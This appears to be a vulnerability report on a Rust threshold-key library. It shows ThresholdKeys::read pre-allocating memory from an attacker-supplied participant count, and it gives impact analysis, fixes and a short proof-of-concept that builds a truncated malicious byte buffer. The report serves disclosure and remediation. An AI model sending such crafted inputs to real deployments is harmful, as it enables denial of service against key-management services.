### Title
Attacker-controlled `n` in serialized `ThresholdKeys` triggers disproportionate pre-allocation, enabling memory-exhaustion DoS - (File: crypto/dkg/src/lib.rs)

### Summary

Analogous to the TensorFlow Lite segment-sum bug (CWE-770: allocation size derived from an untrusted field rather than from data actually present), `ThresholdKeys::read` in `crypto/dkg/src/lib.rs` reads an attacker-controlled `u16` participant count `n` from the input stream and immediately performs `Vec::with_capacity(usize::from(n))` for the `Interpolation::Constant` coefficient vector, before verifying that any coefficient data is actually present. This is in the documented reachable set (`ThresholdKeys::read` is explicitly listed as an untrusted-byte entry point).

### Finding Description [1](#0-0) 

`read` parses `t`, `n`, `i` from raw bytes, then on interpolation tag `0` executes:

```rust
0 => Interpolation::Constant({
  let mut res = Vec::with_capacity(usize::from(n));
  for _ in 0 .. n {
    res.push(C::read_F(reader)?);
  }
  res
}),
```

The `Vec::with_capacity(n)` call commits `n * size_of::<C::F>()` bytes of heap (≈2 MB for `n = 0xFFFF` on a 256-bit field) purely on the basis of the length field, before a single scalar is successfully read. If the stream ends early, `C::read_F` errors — but the oversized allocation has already been performed, and the read loop plus the subsequent `1 ..= n` verification-share loop (`crypto/dkg/src/lib.rs:621-623`) still drive `HashMap` growth and point decoding proportional to the attacker-supplied `n` whenever the input is long enough. There is no sanity bound on `n` relative to the actual remaining input length (contrast `networks/ethereum/src/machine.rs:51-60`, where the same class of bug was explicitly mitigated with chunked reads, and `coordinator/src/p2p.rs:264-270`, where a hard `MAX_LIBP2P_REQRES_MESSAGE_SIZE` cap exists).

Note the allocation is bounded by `u16::MAX` (~2 MB per message for typical fields, plus `n` `HashMap` entries of points), so the primitive is a memory-amplification factor of roughly 10⁵× input size (~20 attacker bytes → ~4–6 MB of allocation + decoding work) rather than a single-shot 4 GB OOM as in the TF report.

### Impact Explanation

An unprivileged party who can feed serialized `ThresholdKeys` bytes to a victim (the accepted reachable surface for this scan) can force each message to allocate and initialize several MB of heap and drive `O(n)` scalar/point decoding work per call. Repeated messages cause cumulative heap pressure, allocator fragmentation, and CPU burn, producing denial of service of the signing/key-management component — the same availability-impact class as the reference advisory, at medium severity given the `u16` bound caps per-message impact.

### Likelihood Explanation

Likelihood is moderate: exploitation requires a deployment that deserializes `ThresholdKeys` from bytes an unprivileged party influences (e.g., keys or key-material messages transported over an authenticated-but-untrusted channel or read from shared storage). Within the scan's threat model this entry point is explicitly in scope. No cryptographic break is needed — the attacker only controls two bytes (`n = 0xFFFF`) and truncates the stream, so cost to the attacker is minimal.

### Recommendation

- In `ThresholdKeys::read`, do not pre-allocate from the untrusted `n`. Replace `Vec::with_capacity(n)` with incremental `push` (allocation then grows only as real data arrives), or first validate `t <= n` via `ThresholdParams::new` *before* any allocation and cap `n` at a protocol-sane maximum.
- Apply the same pattern to the verification-share loop: bound `n` before `HashMap` insertion work begins.
- Where the transport length is known, reject `n` values whose implied serialized size exceeds the actual message length.

### Proof of Concept

```rust
use std::io;
use ciphersuite::Ciphersuite;
use dkg::ThresholdKeys;
// Any in-scope ciphersuite, e.g. dalek_ff_group::Ristretto

fn poc() {
  // Header: curve ID length + curve ID (must match C::ID)
  let mut buf = vec![];
  let id = <Ristretto as Ciphersuite>::ID;
  buf.extend((id.len() as u32).to_le_bytes());
  buf.extend(id);

  // t = 1, n = 0xFFFF, i = 1
  buf.extend(1u16.to_le_bytes());
  buf.extend(0xFFFFu16.to_le_bytes());
  buf.extend(1u16.to_le_bytes());

  // Interpolation::Constant
  buf.push(0);

  // Truncated stream: Vec::with_capacity(65535) already committed ~2 MB
  // before read_F ever runs. Repeat this ~20-byte message to exhaust memory.
  let res = ThresholdKeys::<Ristretto>::read(&mut buf.as_slice());
  assert!(res.is_err()); // fails on read_F, allocation already performed
}
```

Observed behavior: each invocation reserves `65535 * size_of::<F>()` bytes plus drives the `with_capacity` zeroing/bookkeeping, giving ~10⁵× memory amplification per attacker byte on the `Constant` interpolation path, and `O(n)` hash-map/decode work on the verification-share path when the stream is padded.

### Citations

**File:** crypto/dkg/src/lib.rs (L591-616)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };
```
